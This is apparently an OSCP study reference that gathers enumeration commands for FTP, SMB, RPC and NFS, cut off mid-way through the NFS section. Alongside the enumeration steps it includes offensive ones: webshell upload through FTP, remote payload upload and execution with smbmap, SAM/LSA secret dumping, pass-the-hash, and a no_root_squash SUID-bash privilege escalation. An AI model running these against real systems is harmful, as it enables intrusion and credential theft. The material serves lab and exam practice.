# OSCP Service Enumeration — Comprehensive Reference

Consolidated per-service manual enumeration reference covering FTP, SMB/NetBIOS, MSRPC, NFS,
LDAP, SMTP, SNMP, DNS, RDP, WinRM, SSH, and the major database engines (MySQL/MariaDB, MSSQL,
Oracle, PostgreSQL, Redis). Compiled across several focused research passes (each section notes
its own sourcing); jump to the relevant `##` section below for a given protocol.

> **Helper scripts:** [`scripts/fast-nmap.sh`](../scripts/README.md) automates the nmap scan sequence (full TCP → targeted -sC/-sV → UDP top-100 → --script vuln). [`scripts/web-recon.sh`](../scripts/README.md) chains whatweb, ffuf vhost fuzzing, feroxbuster, and nuclei.

---

## FTP & SMB/NetBIOS Manual Enumeration

Compiled from HackTricks, the NetExec/nxc official wiki source, enum4linux/enum4linux-ng, smbmap, and the nmap NSE script source tree (verified against source code, not just secondary blog posts, where possible).

## 1. FTP Enumeration (Port 21)

### Overview
FTP (port 21, control channel) is a plaintext protocol on OSCP-style boxes. Manual enumeration on exam day typically follows this order: banner grab → check `HELP`/`FEAT` → test anonymous login → check for writable/bounce-capable config → automated nmap NSE sweep for anon/bounce/backdoor checks that aren't part of `-sC`/`--script vuln`.

### Findings

**1. Banner grabbing (manual)**
```bash
nc -nv <IP> 21
telnet -vn <IP> 21
```
Grabs the FTP daemon's welcome banner (often reveals exact version, e.g. `vsFTPd 2.3.4`, `ProFTPD 1.3.5`) for offline exploit-search. HackTricks recommends `telnet` over `nc` because FTP's line terminator is `0x0d 0x0a`.

**2. Unauthenticated `HELP`/`FEAT` enumeration**
```
ftp <IP>
> HELP
> FEAT
```
Lists supported commands/extensions (e.g. `AUTH TLS`, `MLSD`, `EPSV`) without authenticating — useful for daemon fingerprinting when the banner is suppressed.

**3. Anonymous login check (manual)**
```bash
ftp <IP>
# Username: anonymous
# Password: anonymous   (or blank, or ftp:ftp)
ftp> ls -a      # list all files, including hidden
ftp> binary     # switch to binary transfer mode
ftp> bye
```
Standard credential triad to test: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`.

**Write access test after anonymous login:**
```bash
# Test for write access after anonymous login
ftp> put test.txt
# If successful, the FTP root may overlap with a web root — drop a webshell
```
If `put` succeeds, the anonymous user has write access to the FTP directory. This is especially dangerous when the FTP root overlaps with a web server's document root (common on IIS boxes where `C:\inetpub\ftproot` is the same as or a parent of `C:\inetpub\wwwroot`) — uploading a webshell (`.aspx`, `.php`) through FTP then triggering it via HTTP is a well-known OSCP foothold pattern.

**Faster (nxc):**
```bash
nxc ftp <IP> -u anonymous -p anonymous
nxc ftp <IP> -u users.txt -p passwords.txt   # credential/anon spray across a list
```
NetExec ships a dedicated `ftp` protocol module (`--port`, `--ls`, `--get`, `--put`) supporting the same `-u`/`-p` credential-check pattern used for SMB/RDP/WinRM/SSH/LDAP elsewhere in this file — a one-liner equivalent of the manual anonymous-login check above.

**4. Anonymous login via browser/wget (bulk download)**
```bash
wget -m ftp://anonymous:anonymous@10.10.10.98          # mirror everything, PASV
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98   # if PASV is disabled
```
Recursively mirrors the entire accessible FTP tree in one shot — faster than manual `mget` when you already know anon access works.

**5. nmap default script anon/bounce check (already part of `-sC`)**
```bash
nmap -sC -sV -p21 <IP>
```
Anonymous-login and FTP-bounce checks (`ftp-anon`, `ftp-bounce`) are part of the `default` NSE category and run automatically with `-sC`. Don't re-run these separately if `-sC` already ran.

**6. Dedicated FTP NSE sweep (script family, not always covered by `-sC`/`--script vuln`)**
```bash
nmap -p21 --script "ftp-*" -sV <IP>
```
Runs every `ftp-*` NSE script. Individually useful ones for OSCP:
- `ftp-anon` — anonymous login + root dir listing (default category, in `-sC`)
- `ftp-bounce` — FTP bounce PORT-scan capability check (default category, in `-sC`)
- `ftp-syst` — sends `SYST`/`STAT`, returns raw OS/daemon info (categories: `default,discovery,safe` — **already covered by `-sC`**, no need to run separately)
- `ftp-brute` — brute-forces FTP creds (categories: `intrusive,brute` — not in default/vuln, the one script in this group genuinely worth an explicit run)
- `ftp-libopie` — checks CVE-2010-1938 OPIE overflow (categories: `vuln,intrusive` — **already covered by `--script vuln`**)
- `ftp-vsftpd-backdoor` — tests vsFTPd 2.3.4 CVE-2011-2523 backdoor (categories: `exploit,intrusive,malware,vuln` — **already covered by `--script vuln`**)
- `ftp-proftpd-backdoor` — tests ProFTPD 1.3.3c backdoor (BID 45150)
- `ftp-vuln-cve2010-4221` — ProFTPD 1.3.2rc3–1.3.3b stack overflow (categories: `intrusive,vuln` — this one IS in `vuln` category)
Source (script descriptions, verified from nmap source tree): https://github.com/nmap/nmap/tree/master/scripts (individual `.nse` files, e.g. https://raw.githubusercontent.com/nmap/nmap/master/scripts/ftp-syst.nse )

FTP bounce scanning (`nmap -b`, manual `PORT`/`EPRT`, Metasploit `ftpbounce`) is rarely seen on OSCP targets — the NSE `ftp-bounce` script in `-sC` already checks for it. Skip the full manual bounce workflow unless you specifically find a bounce-enabled server on an internal network.

### FTP Tools Table

| Tool | Purpose | Typical invocation |
|---|---|---|
| `ftp` (client) | Interactive manual enum, anon login test | `ftp <IP>` |
| `telnet`/`nc` | Banner grab | `telnet -vn <IP> 21` |
| `wget` | Bulk-download anonymous FTP tree | `wget -m ftp://anonymous:anonymous@<IP>` |
| `nmap` NSE (`ftp-*`) | Anon/bounce/backdoor/version checks | `nmap -p21 --script "ftp-*" -sV <IP>` |
| `netexec` (nxc) | Fast anon/credential check, one-liner spray | `nxc ftp <IP> -u anonymous -p anonymous` |

---

## 2. SMB / NetBIOS Enumeration (Ports 139, 445)

### Overview
SMB/NetBIOS is the highest-value OSCP enumeration surface. The standard workflow is: host/NetBIOS discovery → SMB version/signing/dialect fingerprint → null/guest session test → share enumeration → user/group/RID/password-policy enumeration via `rpcclient`/`enum4linux(-ng)`/`netexec` → targeted nmap NSE for anything not covered by `-sC`/`--script vuln`.

### Findings

**1. NetBIOS network sweep**
```bash
nbtscan -r 192.168.0.1/24
nmblookup -A <IP>
```
`nbtscan` maps live NetBIOS hosts + their names across a subnet; `nmblookup -A` resolves the NetBIOS name table of a single host (workgroup, machine name, MAC via `__MSBROWSE__`).

**2. SMB version / dialect / signing fingerprint (nmap NSE — often skipped by beginners running only `-sC`/`vuln`)**
```bash
nmap -p139,445 --script smb-protocols <IP>          # lists supported SMBv1/2/3 dialects, flags SMBv1 as insecure
nmap -p139,445 --script smb-security-mode <IP>       # SMBv1 signing/auth level
nmap -p445 --script smb2-security-mode <IP>          # SMBv2/3 signing requirement (relay-ability check)
nmap -p445 --script smb2-capabilities <IP>           # per-dialect SMBv2/3 server capabilities
nmap -p445 --script smb2-time <IP>                   # server clock + boot time
nmap --script smb-os-discovery -p445 <IP>            # OS, hostname, domain/workgroup, current time
```
None of these are pulled in by `--script vuln`; `smb-os-discovery` is in `default` (so covered by `-sC`), but the rest are not — run them explicitly. `smb2-security-mode` is the fast way to spot signing-not-required hosts (relay targets).
Source (verified from nmap source): https://raw.githubusercontent.com/nmap/nmap/master/scripts/smb-protocols.nse, smb-security-mode.nse, smb2-security-mode.nse, smb2-capabilities.nse, smb2-time.nse, smb-os-discovery.nse

**3. nmap SMB enum-* NSE family (RPC-based enumeration, credentialed or null)**
```bash
nmap --script "safe or smb-enum-*" -p445 <IP>
nmap -p445 --script smb-enum-shares --script-args smbusername=<user>,smbpassword=<pass> <IP>
nmap -p445 --script smb-enum-users <IP>
nmap -p445 --script smb-enum-groups --script-args smbusername=<user>,smbpassword=<pass> <IP>
nmap -p445 --script smb-enum-domains --script-args smbusername=<user>,smbpassword=<pass> <IP>
nmap -p445 --script smb-enum-sessions --script-args smbusername=<user>,smbpassword=<pass> <IP>
nmap -p445 --script smb-enum-services --script-args smbusername=<user>,smbpassword=<pass> <IP>  # needs admin
```
- `smb-enum-shares` — MSRPC `srvsvc.NetShareEnumAll`/`NetShareGetInfo`; falls back to a common-name guess list if enumeration is denied.
- `smb-enum-users` — enumerates all local user accounts over MSRPC (445/139).
- `smb-enum-groups` — lists groups + members (like `enum.exe /G`) via SAMR `EnumDomains`/aliases.
- `smb-enum-domains` — enumerates domains + their password/lockout policies (mostly needs creds except vs Windows 2000).
- `smb-enum-sessions` — who is logged in locally or connected to a share; arguably the most useful for a pentester per nmap's own docs.
- `smb-enum-services`/`smb-enum-processes` — requires admin creds; lists running services/processes via remote registry.
None of these are part of `--script vuln`; only some (like basic share listing) overlap `-sC`'s `default` category weakly — always run this family explicitly for full coverage.

**4. Misc nmap SMB utility scripts**
```bash
nmap -p445 --script smb-system-info --script-args smbusername=<user>,smbpassword=<pass> <IP>   # registry-derived system info (needs admin for full data)
nmap -p445 --script smb-server-stats --script-args smbusername=<user>,smbpassword=<pass> <IP>   # NetServerGetStatistics (needs admin)
nmap -p445 --script smb-ls --script-args smbusername=<user>,smbpassword=<pass>,smb-ls.share=<share> <IP>  # ls-style share file listing
nmap -p445 --script smb-mbenum <IP>                  # queries Windows Master Browser info
```

**5. Full local-workgroup SMB signing sweep (relay-target discovery, nmap alternative to nxc)**
```bash
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 <subnet>
```
Cross-reference against `nxc --gen-relay-list` output below.

**6. smbclient — list shares (null / guest / creds)**
```bash
smbclient --no-pass -L //<IP>                                   # null session
smbclient -N -L \\<IP>                                          # equivalent null-session syntax
smbclient -U 'username[%passwd]' -L //<IP>                      # creds; omit pwd to be prompted
smbclient -U 'username%passwd' -L //<IP> --pw-nt-hash            # pass-the-hash (NT hash as "password")
smbclient -N //<IP>/ --option="client min protocol"=LANMAN1     # force legacy dialect for old boxes
```

**7. smbclient — connect to a specific share / recursive download**
```bash
smbclient --no-pass //<IP>/<Share>
smbclient -U 'user%pass' //<IP>/<Share>
smb: \> mask ""          # filter mask ("" = all files)
smb: \> recurse           # toggle recursion on
smb: \> prompt            # turn off per-file confirmation
smb: \> mget *            # download everything matching mask, recursively
```
The `mask ""; recurse; prompt; mget *` combo is the standard "download the whole share" one-liner.

**8. smbclient — manual share-name brute force (when listing is blocked)**
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE>       # null session against a guessed share name
smbclient -U '<USER>' \\\\<IP>\\<SHARE>     # authenticated session
```
Try common names: `C$ D$ ADMIN$ IPC$ PRINT$ FAX$ SYSVOL NETLOGON`. Distinguish `NT_STATUS_ACCESS_DENIED` (share exists, no access) from `NT_STATUS_BAD_NETWORK_NAME` (share doesn't exist) even when list-shares is disabled.

**9. smbclient — Kerberos auth**
```bash
smbclient --use-kerberos=required //ws01win10.domain.com/C$
```
Samba 4.15+ replaced the standalone `--kerberos` long flag with the tri-state `--use-kerberos=desired|required|off` (`-k` is kept only as a deprecated short-flag alias); modern Kali ships well past 4.15, so bare `--kerberos` will be rejected as unrecognized.

**10. smbmap — basic + credentialed enumeration**
```bash
smbmap -H <IP>                                        # null-session share enum
smbmap -H <IP> -u null -p null                         # explicit null user
smbmap -H <IP> -u guest                                 # guest session
smbmap -u "username" -p "password" -H <IP> [-P <PORT>]  # creds
smbmap -u "username" -p "<LMHASH>:<NTHASH>" -H <IP>      # pass-the-hash
smbmap -R -u "username" -p "password" -H <IP>            # recursive listing of all shares
smbmap -r <Folder> -H <IP> -u user -p pass                # non-recursive listing of a specific folder
```
`-s <SHARE>` targets a single share (default `C$`); `-d <DOMAIN>` sets domain (default `WORKGROUP`); omitting `-u` assumes a null session.

**11. smbmap — search/download/execute**
```bash
sudo smbmap -R Folder -H <IP> -A <FileName> -q      # recursive search+auto-download matching filename pattern
smbmap -u user -p pass -H <IP> --download 'C$\temp\passwords.txt'
smbmap -u user -p pass -H <IP> --upload '/tmp/payload.exe' 'C$\temp\payload.exe'
smbmap -u user -p pass -H <IP> -x 'net group "Domain Admins" /domain'   # RCE via wmi/psexec if write access
smbmap -u user -p pass -H <IP> --admin                # quick check: is this account local admin?
smbmap -u user -p pass -H <IP> --signing              # check SMB signing enabled/disabled/required
```

**12. enum4linux (legacy Perl, still on the OSCP exam VM) — full and targeted runs**
```bash
enum4linux -a <IP>                        # do all simple enumeration (-U -S -G -P -r -o -n -i)
enum4linux -U <IP>                        # userlist only
enum4linux -S <IP>                        # sharelist only
enum4linux -G <IP>                        # group and member list
enum4linux -P <IP>                        # password policy
enum4linux -o <IP>                        # OS information
enum4linux -i <IP>                        # printer information
enum4linux -u <user> -p <pass> -a <IP>    # authenticated full enum
```

**13. enum4linux-ng (Python rewrite; default on modern Kali) — flags**
```bash
enum4linux-ng.py -As <target>                          # all simple enum, no NetBIOS lookup (recommended default)
enum4linux-ng.py -A <target>                            # all simple enum incl. nmblookup (-U -G -S -P -O -N -I -L)
enum4linux-ng.py -u '<user>' -p '<pass>' -As <target>    # authenticated
enum4linux-ng.py -U <target>                             # users via RPC
enum4linux-ng.py -G -Gm <target>                         # groups + group members
enum4linux-ng.py -S <target>                             # shares via RPC
enum4linux-ng.py -P <target>                             # password policy via RPC
enum4linux-ng.py -O <target>                             # OS info via RPC
enum4linux-ng.py -L <target>                              # LDAP domain info (DCs only)
enum4linux-ng.py -R [BULK_SIZE] <target>                 # RID cycling (NOT enabled by default, unlike original enum4linux)
enum4linux-ng.py -r 500-550,1000-1050 -R <target>          # custom RID ranges for cycling
enum4linux-ng.py -As -oY out <target>                      # export findings as YAML (also -oJ / -oA)
```
Key OSCP-relevant differences from `enum4linux.pl`: RID cycling is opt-in (`-R`), group members aren't pulled by default (need `-Gm`), and it supports NTLM-hash auth (`-H`) and Kerberos ticket auth (`-K`).

**14. rpcclient — session setup (null / credentialed / PtH)**
```bash
rpcclient -U "" -N <IP>                                              # null session, no password prompt
rpcclient -U "" <IP>                                                  # null user, will prompt for empty password
rpcclient -U "username%password" <IP>                                  # authenticated
rpcclient //machine.htb -U 'domain.local/USERNAME%<NTHASH>' --pw-nt-hash   # pass-the-hash
rpcclient -k ws01win10.domain.com                                        # Kerberos
```

**15. rpcclient — user enumeration**
```
srvinfo                          # server info banner
querydispinfo                     # list users (display info)
enumdomusers                      # enumerate domain users (returns username + RID)
queryuser 0x<rid>                 # detailed info on one user by RID
queryusergroups 0x<rid>           # groups a user belongs to
queryuseraliases builtin|domain <sid>  # aliases for a user
lookupnames <username>             # resolve username -> SID
```

**16. rpcclient — group / alias / domain enumeration**
```
enumdomgroups                     # list domain groups
querygroup 0x<rid>                # group details by RID
querygroupmem 0x<rid>             # members of a group
enumalsgroups builtin|domain       # alias (local) groups
queryaliasmem builtin|domain 0x<rid>  # members of an alias group
enumdomains                        # list domains
lsaquery                            # get domain SID
querydominfo                        # domain info (incl. password policy fields)
```

**17. rpcclient — share enumeration**
```
netshareenumall                    # list all shares
netsharegetinfo <share>             # detail on one share
enumprinters; netshareenumall       # printer + share enum in one -c call
```

**18. rpcclient — SID/RID cycling (manual, LSARPC)**
```
lookupnames <username>       # username -> SID
lsaenumsid                    # enumerate additional SIDs
lookupsids <sid>              # SID -> username (this is the actual RID-cycling primitive)
```
```bash
# scripted RID cycling one-liner (bash loop, no creds required if null session works)
for i in $(seq 500 1100); do
  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
done
```
Cycles well-known RID ranges (500–1100 covers most built-in + early custom accounts) to enumerate usernames even when `enumdomusers` is blocked.

**19. rpcclient — extra reference commands**
| Command | Interface | Description |
|---|---|---|
| `dsroledominfo` | LSARPC-DS | Primary domain information |
| `dsenumdomtrusts` | LSARPC-DS | Enumerate trusted domains in the forest |
| `createdomuser` / `deletedomuser` | SAMR | Create/delete a domain user (requires privs) |
| `lsaaddacctrights` / `lsaremoveacctrights` | LSARPC | Add/remove rights on a user account |

**20. Impacket alternatives for user/RPC enumeration**
```bash
samrdump.py -port 445 [[domain/]username[:password]@]<target>
rpcdump.py -port 135 [[domain/]username[:password]@]<target>
lookupsid.py -no-pass <hostname.local>                # local user RID enumeration
```

**21. Null session enumeration — the canonical 3-tool combo**
```bash
smbclient -N -U "" -L \\<IP>
rpcclient -N -U "" <IP>
rpcclient> enumdomusers
```
```bash
nxc smb <IP> -u '' -p ''
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u '' -p '' --pass-pol
nxc smb <IP> -u '' -p '' --users
nxc smb <IP> -u '' -p '' --groups
```
A blank-user/blank-pass ("null") session on the `IPC$` pipe. On a DC without RestrictAnonymous hardening this alone can dump users, groups, and password policy. Good HTB/OSCP-style practice targets for this: Forest, Monteverde.

**22. netexec (nxc) — host discovery / OS+signing fingerprint**
```bash
nxc smb 192.168.1.0/24
```
Sweeps a range, printing hostname, OS build, domain/workgroup, `signing:` state, and `SMBv1:` support for every live SMB host in one pass.

**23. netexec (nxc) — guest logon check**
```bash
nxc smb 10.10.10.178 -u 'a' -p ''
nxc smb 10.10.10.178 -u 'a' -p '' --shares
```
Fake username + empty password tests whether the domain/local Guest account is enabled. (2025+ nxc builds can auto-detect this with no creds at all if `check_guest_account` is set `true` in `~/.nxc/nxc.conf`.) Good practice target: HTB Nest.

**24. netexec (nxc) — SMB signing sweep (relay-target list)**
```bash
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt
```
Outputs one IP per line for every host where `signing:False`, i.e. every host vulnerable to SMB relay.

**25. netexec (nxc) — shares enumeration + ACL/permission filter**
```bash
nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares
nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ,WRITE
nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ
nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares WRITE
```
Lists every share plus your effective READ/WRITE permission on each — described by the maintainers as "by far one of the most useful features of nxc."

**26. netexec (nxc) — disks**
```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --disks
```

**27. netexec (nxc) — domain users**
```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --users
nxc smb <IP> -u UserName -p 'PASSWORDHERE' --users-export output.txt   # dump usernames straight to a file for spraying
```

**28. netexec (nxc) — RID brute (RID cycling)**
```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute 10000   # custom max RID
```
Automates the manual `rpcclient lookupsids` loop shown above — this is nxc's built-in RID-cycling module.

**29. netexec (nxc) — local groups and domain groups**
```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --local-groups
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --groups
```
`--groups` (SMB module) still enumerates domain groups directly — verified current against `nxc/protocols/smb/proto_args.py` in the NetExec source. The LDAP module also exposes its own `--groups` (`nxc ldap <target> -u u -p p --groups`) as an alternate path, not a replacement.

**30. netexec (nxc) — password policy**
```bash
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --pass-pol
```

**31. netexec (nxc) — sessions / logged-on users**
```bash
nxc smb <IP> -u Administrator -p 'password' --loggedon-users
nxc smb $TARGET/24 -u $USER -p $PASSWORD --reg-sessions              # newer: via Remote Registry \winreg pipe (HKEY_USERS)
nxc smb $TARGET/24 -u $USER -p $PASSWORD --reg-sessions 'admin_user' # filter by a specific username
nxc smb $TARGET/24 -u $USER -p $PASSWORD --reg-sessions './users.txt'  # filter by list of usernames
```
`--reg-sessions` only indicates the user has a login context (primary token) on the box, **not** necessarily an active interactive session — don't assume it's safe to impersonate for lateral movement modules like `schtask_as` without further checks.

**32. netexec (nxc) — network interfaces (admin-only)**
```bash
nxc smb 192.168.56.11 -u USERNAME -p 'PASSWORDHERE' --interfaces
```
Requires local admin; enumerates NICs on the target — useful for finding dual-homed pivot boxes.

**33. netexec (nxc) — the "run everything" one-liner**
```bash
nxc smb <IP or domain> -u '<username>' -p '<password>' --groups --local-groups --loggedon-users --rid-brute --smb-sessions --users --shares --pass-pol
```
Chains group, local-group, logged-on-users, RID-brute, sessions, users, shares, and password-policy modules in a single authenticated pass.

**34. crackmapexec (legacy name, same syntax family, still referenced/aliased on older exam images)**
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam       # dump local SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa       # dump LSA secrets
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <NTHASH> --shares      # pass-the-hash
```

**35. nmap `smb-brute` (credential brute-force NSE, distinct from generic vuln scan)**
```bash
nmap --script smb-brute -p445 <IP>
```
Not part of `-sC` or `--script vuln`; intrusive — mentioned here for completeness but flagged in HackTricks as "not recommended" due to lockout risk.

**36. `smb-vuln-*` — for reference, these ARE covered by generic `--script vuln`/manual CVE scans (do not duplicate)**
`smb-vuln-ms17-010`, `smb-vuln-ms08-067`, `smb-vuln-cve2009-3103`, `smb-vuln-ms06-025`, `smb-vuln-ms07-029`, `smb-vuln-ms10-054`, `smb-vuln-ms10-061`, `smb-vuln-conficker`, `smb-vuln-cve-2017-7494` (SambaCry), `smb-vuln-regsvc-dos`, `smb-vuln-webexec`, `smb-double-pulsar-backdoor`. Listed here only so you know NOT to re-add them to a "manual enumeration not covered by vuln scan" checklist — they belong to the vulnerability-scanning phase, not enumeration.

### SMB/NetBIOS Tools Table

| Tool | Purpose | Typical invocation |
|---|---|---|
| `nbtscan` / `nmblookup` | NetBIOS name discovery | `nbtscan -r 192.168.0.1/24` |
| `nmap` NSE (`smb-*`, `smb2-*`) | Version/signing/dialect/enum-* checks not in `-sC`/vuln | `nmap --script "safe or smb-enum-*" -p445 <IP>` |
| `smbclient` | List/connect/download shares, null & PtH sessions | `smbclient -N -L //<IP>` |
| `smbmap` | Share + permission enum, search/download/RCE | `smbmap -H <IP> -u user -p pass -R` |
| `enum4linux` | Legacy all-in-one SMB/RPC enum wrapper | `enum4linux -a <IP>` |
| `enum4linux-ng` | Modern Python rewrite, JSON/YAML export, opt-in RID cycling | `enum4linux-ng.py -As <IP>` |
| `rpcclient` | Raw SAMR/LSARPC interaction: users, groups, SIDs, shares | `rpcclient -U "" -N <IP>` |
| `netexec`/`nxc` (`crackmapexec` legacy) | Mass SMB enum: shares/users/groups/pass-pol/RID-brute/sessions | `nxc smb <IP> -u u -p p --shares --users --pass-pol --rid-brute` |
| Impacket (`samrdump.py`, `rpcdump.py`, `lookupsid.py`) | Python-native RPC/SID enumeration | `samrdump.py -port 445 domain/user:pass@<IP>` |

---

## Sources (deduplicated)
- HackTricks — Pentesting FTP: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
- HackTricks — FTP Bounce Attack: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
- HackTricks — Pentesting SMB: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
- HackTricks — rpcclient enumeration: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
- NetExec-Wiki (official docs source, rendered at netexec.wiki): https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/smb-protocol/enumeration
- NetExec source (flag verification): https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/smb.py
- enum4linux-ng README: https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/README.md
- enum4linux (original): https://github.com/CiscoCXSecurity/enum4linux
- smbmap README: https://raw.githubusercontent.com/ShawnDEvans/smbmap/master/README.md
- nmap NSE script source tree (script.db + individual `.nse` descriptions): https://github.com/nmap/nmap/tree/master/scripts

---

## RPC, NFS, and LDAP Enumeration

## Overview
These three services are recurring OSCP/PWK enumeration targets because they frequently expose information — or full read/write access — without authentication:

- **RPC (port 111/135 + high ports)**: `rpcinfo` fingerprints registered RPC services (NFS, mountd, NIS, status daemons) on a portmapper; `rpcclient` abuses SMB/MSRPC null sessions on Windows/Samba hosts to pull users, groups, domain info, and password policy without credentials.
- **NFS (port 2049 + mountd)**: `showmount` reveals exported shares without authentication; NFSv3's client-trusted UID/GID model means access control is only as strong as the attacker's ability to spoof a UID — `no_root_squash` is the headline misconfiguration, but UID-matching and SSH-key-planting techniques extend exploitation even when root is squashed.
- **LDAP (port 389/636, 3268/3269 GC)**: Many AD environments and most standalone OpenLDAP boxes in labs allow anonymous/simple binds. `ldapsearch` is the raw tool; `windapsearch` and `ldapdomaindump` are Python wrappers that structure the same LDAP queries into usable output (user/group/computer lists, HTML domain reports).

---

### RPC Enumeration

**1. Fingerprint the portmapper / RPC services with rpcinfo**
```
rpcinfo -p <target-ip>
```
Queries the portmapper (rpcbind, TCP/UDP 111) on the target and lists every registered RPC program with its program number, version, protocol, and port — this is how you discover `nfs`, `mountd`, `nlockmgr`, `rquotad`, `ypbind`/`ypserv` (NIS), and `status` are running before ever touching `showmount`. Typical output:
```
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100005    1   udp  59353  mountd
    100003    3   tcp   2049  nfs
    100021    1   udp  34104  nlockmgr
```

**2. Nmap RPC enumeration as a companion/alternative to rpcinfo**
```
nmap -sV --script=rpcinfo -p 111 <target-ip>
```
Useful when the portmapper is firewalled on 111 but rpcinfo's raw UDP/TCP probe is blocked while nmap's NSE variant (or a source-port-111 trick) still gets through.

**3. Open a null session with rpcclient**
```
rpcclient -U "" -N <target-ip>
```
`-U ""` supplies an empty (anonymous) username, `-N` suppresses the password prompt so no credential is sent at all — this is the SMB/MSRPC equivalent of an NFS anonymous mount and is the entry point for every command below. On Samba/Linux targets the equivalent anonymous form is `rpcclient -U '%' <target-ip>` (empty user, empty password separated by `%`).

**4. Enumerate domain users**
```
rpcclient $> enumdomusers
```
or chained non-interactively:
```
rpcclient -U "" -N <target-ip> -c "enumdomusers"
```
Lists every domain user account with its RID; combine with `queryuser 0x<RID>` to pull full account detail (bad password count, last logon, account flags) for a specific user.

**5. Enumerate domain groups and group membership**
```
rpcclient $> enumdomgroups
rpcclient $> querygroup 0x<RID>
rpcclient $> queryusergroups 0x<user-RID>
```
`enumdomgroups` lists group names/RIDs; `querygroup` returns a group's detail; `queryusergroups` reverses the lookup to show what groups a given user RID belongs to.

**6. Pull domain and password-policy info without credentials**
```
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```
`querydominfo` returns domain name/SID, user/group counts, and server role; `getdompwinfo` returns the password policy (min password length, lockout parameters) — directly usable to size a password-spraying attempt without triggering a lockout.

**7. Resolve SIDs and names (RID cycling groundwork)**
```
rpcclient $> lsaquery
rpcclient $> lookupnames <username>
rpcclient $> lookupsids <SID>
```
`lsaquery` returns the domain SID; `lookupnames` resolves a known username to its SID; `lookupsids` resolves a SID back to a name — chaining `lsaquery` + a RID-brute loop of `lookupsids S-1-5-21-...-500`, `-501`, `-1000`... is the classic manual "RID cycling" technique when `enumdomusers` is restricted.

**8. Enumerate shares and server info**
```
rpcclient $> srvinfo
rpcclient $> netshareenum
rpcclient $> netshareenumall
```
`srvinfo` gives OS/server type; `netshareenum`/`netshareenumall` list SMB shares (including hidden `$` shares) reachable via the same null session, complementing `smbclient -L`.

**9. Enumerate privileges**
```
rpcclient -U "" -N <target-ip> -c "enumprivs"
```
Lists all privileges known to the LSA on the box — useful context when chaining to token-privilege-abuse post-exploitation.

---

### NFS Enumeration

**10. List NFS exports without mounting**
```
showmount -e <target-ip>
```
Queries mountd directly and lists every export path the host advertises plus the client ACL for each (e.g. `*`, a CIDR, or a specific host) — always run this before attempting a mount, since it also reveals which exports are world-mountable.

**Faster (nxc):**
```bash
nxc nfs <target-ip> --shares          # equivalent to showmount -e
nxc nfs <target-ip> --enum-shares     # recursively enumerate exposed shares (default depth 3)
```
NetExec ships a dedicated `nfs` protocol module (`--shares`, `--enum-shares`, `--ls`, `--get-file`, `--put-file`, `--chmod`) — a fast-triage alternative/companion to the manual `showmount` + mount workflow below.

**11. List currently connected/mounted clients**
```
showmount -a <target-ip>
```
Shows `host:directory` pairs of who currently has each export mounted — helpful for identifying a live client whose UID you may want to impersonate, or to check if your own probe mount registered.

**12. List the raw directory export list (no client info)**
```
showmount -d <target-ip>
```
Equivalent to `-e` but only prints the directory paths, useful for quick scripting/grepping when you don't need the ACL column.

**13. Mount an NFS export locally**
```
mkdir /mnt/nfs-share
mount -t nfs -o vers=3 <target-ip>:/<export-path> /mnt/nfs-share
```
Forcing `vers=3` matters because NFSv3 is the version whose client-trusted UID/GID model enables the UID-spoofing attacks below; many targets still default to it. Add `,nolock` if `rpc.statd`/`nlockmgr` isn't reachable and mount hangs.

**14. Check for no_root_squash after mounting (SUID shell technique)**
```
mount -t nfs -o vers=3 <target-ip>:/<export> /mnt/nfs-share
cp /bin/bash /mnt/nfs-share/bash
chmod +s /mnt/nfs-share/bash
```
If the export is configured `no_root_squash`, files you create as local root retain root ownership on the server side; setting the SUID bit on a copied `bash` binary from the attacking box (where you are root) means executing that same file from a shell on the target (where the mount is also visible) runs as root, regardless of the invoking user's privileges there.

**15. Beyond no_root_squash — UID-matching technique**
```
id <target-user>                     # on the box, via another foothold, find their UID
useradd -u <matching-uid> -o -M shadowuser
su shadowuser
cp <ssh-pubkey-or-payload> /mnt/nfs-share/home/<target-user>/
```
